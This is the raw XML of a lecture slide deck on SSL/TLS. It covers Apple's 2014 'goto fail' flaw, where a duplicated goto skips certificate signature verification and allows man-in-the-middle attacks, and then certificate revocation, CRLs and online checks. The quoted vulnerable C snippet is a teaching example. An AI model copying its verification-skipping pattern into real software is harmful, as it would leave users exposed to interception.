                    <a:pt x="593527" y="285749"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="201707"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="593527" y="114299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="593527" y="0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5860929" name="object 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1755000" y="1453320"/>
            <a:ext cx="7028280" cy="383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31920">
              <a:lnSpc>
                <a:spcPts val="2880"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="99"/>
              </a:spcBef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6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PayPal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-1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7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certificate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31920">
              <a:lnSpc>
                <a:spcPts val="2880"/>
              </a:lnSpc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And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here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my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signed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Diffie-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Hellman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value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100"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="2381"/>
              </a:spcBef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verify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signature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on</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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DH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value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using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public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key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from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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Tahoma"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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190440">
              <a:lnSpc>
                <a:spcPct val="119000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1190"/>
              </a:spcBef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if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((err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=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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SSLHashSHA1.update(&amp;hashCtx,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&amp;clientRandom))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!=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0)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goto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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fail;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190440">
              <a:lnSpc>
                <a:spcPct val="119000"/>
              </a:lnSpc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if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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((err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=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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SSLHashSHA1.update(&amp;hashCtx,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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&amp;serverRandom))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!=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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0)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goto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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fail;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19040" indent="-254160">
              <a:lnSpc>
                <a:spcPct val="119000"/>
              </a:lnSpc>
              <a:tabLst>
                <a:tab pos="0" algn="l"/>
              </a:tabLst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if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((err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=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SSLHashSHA1.update(&amp;hashCtx,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&amp;signedParams))</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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!=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0)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goto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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fail;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042968" name="object 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2161440" y="4968000"/>
            <a:ext cx="82332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goto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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fail;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277887" name="object 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1907640" y="5260320"/>
            <a:ext cx="520668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if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((err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=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SSLHashSHA1.final(&amp;hashCtx,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&amp;hashOut))</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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!=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> 0)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007740" name="object 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1907640" y="5504039"/>
            <a:ext cx="2066400" cy="118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60840" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="266760">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479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goto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fail;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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52">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>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0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err =</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-7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1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>sslRawVerify(...);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0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-52">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>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80"/>
              </a:spcBef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fail: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…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return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Tahoma"/>
              </a:rPr>
              <a:t>err</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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1600" b="0" strike="noStrike" spc="-60">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>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345598" name="object 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4343400" y="5791320"/>
            <a:ext cx="2798640" cy="274680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E0E0E0"/>
          </a:solidFill>
          <a:ln w="9524">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round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9144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Signature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Tahoma"/>
              </a:rPr>
              <a:t>verified</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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1800" b="0" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>here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3044330" name="object 20"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3048120" y="4948200"/>
            <a:ext cx="1294920" cy="1157040"/>
            <a:chOff x="3048120" y="4948200"/>
            <a:chExt cx="1294920" cy="1157040"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="789" name="object 21"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3962519" y="5791320"/>
              <a:ext cx="380520" cy="31392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381000" h="314325" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="380999" y="235743"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="156967" y="235743"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156967" y="314324"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="157162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156967" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156967" y="78580"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="380999" y="78580"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="380999" y="235743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0" name="object 22"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3048120" y="4948200"/>
              <a:ext cx="380520" cy="31392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381000" h="314325" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="156968" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="157161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156968" y="314325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156968" y="235743"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="381000" y="235743"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="381000" y="78579"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156968" y="78579"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156968" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FF2600"/>
            </a:solidFill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1" name="object 23"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3048120" y="4948200"/>
              <a:ext cx="380520" cy="313920"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 380520"/>
                <a:gd name="textAreaRight" fmla="*/ 380880 w 3805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381000" h="314325" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="380999" y="235743"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="156968" y="235743"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156968" y="314324"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="157162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156968" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156968" y="78580"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="380999" y="78580"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="380999" y="235743"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="28574">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round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957860" name="object 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3507840" y="4909680"/>
            <a:ext cx="54324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defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>???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7356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Complete</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-8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Fail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-8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Against</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-8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21">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>MITM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882426" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1555560"/>
            <a:ext cx="5716080" cy="4771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Discovered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in</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-9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February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2014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0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All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OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-1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X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and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iOS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software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vulnerable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man-in-the-middle attacks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 algn="just">
              <a:lnSpc>
                <a:spcPct val="99000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="629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Broken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TLS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implementation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-4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provides </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="sng" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>no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protection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against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very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attack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was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supposed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prevent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689"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Lucida Sans Unicode"/>
              <a:buChar char="◆"/>
              <a:tabLst>
                <a:tab pos="35568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What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does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this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tell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-4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you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about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quality</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-41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control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-3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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-3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1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>security-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critical software?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8461422" name="object 4"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5943600" y="1981080"/>
            <a:ext cx="3004920" cy="3580920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="140824927" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="76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B9D0A034-E116-4F58-930E-8574EB50912A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62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862288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157759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Certificate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-72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Revocation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9132674" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="77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45D919DA-BAB4-4AD5-BB3F-16C4AAE9B2BC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63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149541" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1555560"/>
            <a:ext cx="8104320" cy="5197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9000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9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Revocation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-72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u="sng" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>very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important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615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Many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valid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reasons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to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revoke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certificate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99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Private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key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corresponding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certified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public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key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has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been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compromised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820"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="740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User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stopped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paying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certification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fee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and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the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no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longer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wishes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certify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him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has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been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compromised!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714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Expiration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is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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-6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form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of</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-5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revocation,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-6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26">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>too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44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Many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deployed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-4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systems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don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’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bother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with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revocation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ts val="2820"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="765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Re-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issuance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big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revenue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source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for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60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authorities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086807" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="485280" y="474840"/>
            <a:ext cx="8244000" cy="12319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defRPr/>
            </a:pP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Certificate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-100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">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Revocation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-97">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Mechanisms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1819509" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="78"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8443440" y="6478560"/>
            <a:ext cx="588960" cy="397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12600" indent="0">
              <a:lnSpc>
                <a:spcPts val="1426"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>slide</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" strike="noStrike" spc="-7">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:fld id="{36196803-78F7-4A81-B3ED-7293FEEC27A6}" type="slidenum">
              <a:rPr lang="en-US" sz="1200" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>64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515293" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1556640"/>
            <a:ext cx="8397000" cy="4382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88920" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="354960" indent="-342360">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="70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Online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revocation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-97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service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49160" lvl="1" indent="-279360">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="476"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="749160" algn="l"/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008080"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>	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When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certificate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presented,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recipient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goes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52">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>a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special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online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service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to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verify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whether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it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still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valid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354960" indent="-342360">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="590"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Lucida Sans Unicode"/>
              <a:buChar char="◆"/>
              <a:tabLst>
                <a:tab pos="35496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Certificate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revocation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list</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-86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(CRL)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646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periodically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issues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signed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list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of</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-32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revoked</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-3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certificates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754920" lvl="1" indent="-285120">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="519"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="754920" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pP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Can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issue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a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“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delta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-15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CRL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-7">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic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containing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-26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">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>only</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>updates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444600">
              <a:lnSpc>
                <a:spcPct val="102000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="635"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="0" algn="l"/>
              </a:tabLst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Q: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Does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revocation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-75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protect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">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>against</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-8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800" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>forged certificates?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173016" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="628650" y="451381"/>
            <a:ext cx="7884414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600" indent="0">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="5700" b="0" strike="noStrike" spc="-1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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5700" b="0" strike="noStrike" spc="-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1137939" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="628649" y="4983276"/>
            <a:ext cx="7884414" cy="1126680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom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008080"/>
              </a:buClr>
              <a:tabLst>
                <a:tab pos="354960" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pP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Kaufman –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike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b="0" strike="noStrike" spc="-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SSL/TLS</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2133298667" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="17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2600" indent="0">
              <a:lnSpc>
                <a:spcPts val="1426"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr lang="en-US" sz="1200" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t>slide</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" strike="noStrike" spc="-7">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:fld id="{F469351A-5AE8-4D59-907F-F988E6F6C8A5}" type="slidenum">
              <a:rPr lang="en-US" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t>65</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" b="0" strike="noStrike" spc="-1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17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7817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8173016" grpId="0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65</Slides>
  <Notes>65</Notes>
  <HiddenSlides>0</HiddenSlides>
  <MMClips>2</MMClips>
  <ScaleCrop>0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Theme 1</vt:lpstr>
      <vt:lpstr>Theme 2</vt:lpstr>
      <vt:lpstr>Theme 3</vt:lpstr>
      <vt:lpstr>Theme 4</vt:lpstr>
      <vt:lpstr>Theme 5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3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-03-24T22:59:03Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-01T00:08:01Z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